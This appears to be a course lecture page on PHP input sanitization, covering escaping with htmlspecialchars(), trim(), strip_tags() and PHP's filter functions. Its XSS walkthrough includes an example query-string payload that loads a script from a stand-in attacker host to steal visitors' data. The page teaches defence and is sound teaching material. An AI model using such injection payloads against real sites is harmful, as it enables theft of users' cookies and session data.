---
layout: base
title: PHP - Sanitization
course: SDEV255
---

<!-- - Escape output
  - htmlspecialchars()
  - htmlentities()
  - strip_tags()
- Sanitize input
  - trim()
  - https://www.php.net/manual/en/function.filter-var.php
    - filter_var()
    - filter_var_array()
    - filter_input()
    - filter_input_array()
    - filter_has_var()
    - filter_list() -->

- [Sanitization](#sanitization)
  - [Validation vs Sanitization](#validation-vs-sanitization)
  - [Purpose of Sanitization](#purpose-of-sanitization)
  - [Escaping Values](#escaping-values)
    - [Cross-Site Scripting (XSS)](#cross-site-scripting-xss)
      - [How XSS Works](#how-xss-works)
      - [XSS Example](#xss-example)
    - [htmlspecialchars()](#htmlspecialchars)
  - [Removing Unwanted Values](#removing-unwanted-values)
    - [trim()](#trim)
    - [strip_tags()](#strip_tags)
  - [Filter Functions](#filter-functions)
    - [Input vs Var, Single vs Array](#input-vs-var-single-vs-array)

# Sanitization

## Validation vs Sanitization

**Validation** - is the process of ensuring that the input matches the expected format, range, type, length, etc.

**Sanitization** - is the process of removing unwanted characters, whitespace, HTML tags, etc.

## Purpose of Sanitization

- Prevents malicious code from being injected into application
- Prevents unwanted characters from being
  - Displayed to the user
  - Stored in database
  - Stored in files
  - Sent to other applications

## Escaping Values

**Escaping** - is the process of converting special characters to their HTML entity equivalents.

### Cross-Site Scripting (XSS)

**Cross-Site Scripting (XSS)** - is a type of injection attack where malicious scripts are injected into trusted websites.

The scripts may then:

- Steal cookies and session tokens
- Redirect the user to another website
- Send content to other applications

#### How XSS Works

1. Hacker visits a website and probes for query string vulnerabilities.
<figure>
    <span>
        <img src="images/hacker.jpg" style="width:40%;">
    </span>
</figure>

2. Hacker finds query string named `q` is not sanitized.

3. Hacker tricks other people into visiting website with following query string: `q=<script src=http://really-terrible-site/steal-data.js></script>`

4. JS file runs on victim's browser and sends data to hacker's website.

5. Hacker sells data on the dark web and buys yacht.

<figure>
    <span>
        <img src="https://media.boatsnews.com/src/images/news/articles/ima-computer-science-screen-37738.webp" style="width:40%">
    </span>
</figure>

#### XSS Example

<p class="demo">Walkthrough</p>

[Text: Example of an XSS Attack](http://localhost/phpbook/section_b/c06/)

### htmlspecialchars()

- Converts special characters to HTML entities
- May optionally specify which characters to convert and the character encoding

```php
$input = '<script>alert("XSS");</script>';
<p><?php echo htmlspecialchars($input, ENT_QUOTES, 'UTF-8'); ?></p
```

## Removing Unwanted Values

### trim()

- Removes whitespace from beginning and end of a string
- May optionally specify which characters to remove

```php
$cleanedInput = trim($userInput);
```

### strip_tags()

- Removes HTML tags from a string
- May optionally specify which tags to allow

```php
$cleanedInput = strip_tags($userInput);
```

## Filter Functions

PHP has built-in functions for validating and sanitizing input.

Each function takes a value and a filter type as parameters.

Each function returns the filtered value or `false` if the value is not valid.

See [PHP: Filter extension](https://www.php.net/manual/en/book.filter.php).

| Function               | Description                                                             |
| ---------------------- | ----------------------------------------------------------------------- |
| `filter_var()`         | Filters a single variable with a specified filter.                      |
| `filter_var_array()`   | Filters multiple variables with a specified filter or array of filters. |
| `filter_input()`       | Gets a specific external variable by name and optionally filters it.    |
| `filter_input_array()` | Gets multiple external variables and optionally filters them.           |
| `filter_has_var()`     | Checks if a variable of a specified input type exists.                  |

### Input vs Var, Single vs Array

- `filter_input()` and `filter_input_array()` are used to filter **input** from external sources.
  - `$_GET`
  - `$_POST`
- `filter_var()` and `filter_var_array()` are used to filter **variables**.
  - `$var1`
  - `$var2`
- The "array" versions of the functions are used to filter multiple values at once.

..........................................................

<p class="demo">Walkthrough</p>

[Text: Validate Form](http://localhost/phpbook/section_b/c06/validate-form.php)

<p class="demo">Walkthrough</p>

[Text: Validate Form Using Filters](http://localhost/phpbook/section_b/c06/validate-form-using-filters.php)

**To come:**

- DB sanatization
  - Prepared statements
  - Parameterized queries
